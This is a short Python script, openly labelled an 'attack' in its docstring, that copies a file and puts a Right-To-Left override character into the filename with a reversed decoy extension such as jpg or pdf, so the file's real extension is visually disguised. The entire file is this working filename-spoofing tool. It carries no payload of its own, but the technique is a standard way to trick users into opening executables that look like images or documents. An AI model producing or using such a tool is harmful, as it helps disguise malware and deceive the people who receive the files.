'''
Usage: rtloattack.py /filepath/file <intended extension without dot>
Creates copy of given file with Right-To-Left override applied to filename

If extension is not provided, one will be supplied randomly

This "attack" is picked up by WinDefender on run and does not show in CLIs
'''
from sys import argv
from random import randint
from shutil import copy

exts = ["jpg", "png", "bmp", "log", "pdf", "txt", "csv"]

# Split extension from filename and store in memory
filename, oldExtension = argv[1].split(".")

# Determine extension based on cli arguments, then reverse it
newExtension = (argv[2] if len(argv) > 2 else exts[randint(0, len(exts) - 1)])[::-1]

# Construct final filename and create copy with RTLO applied
rtloFilename = f"{filename}\u202E{newExtension}.{oldExtension}"
copy(argv[1], rtloFilename)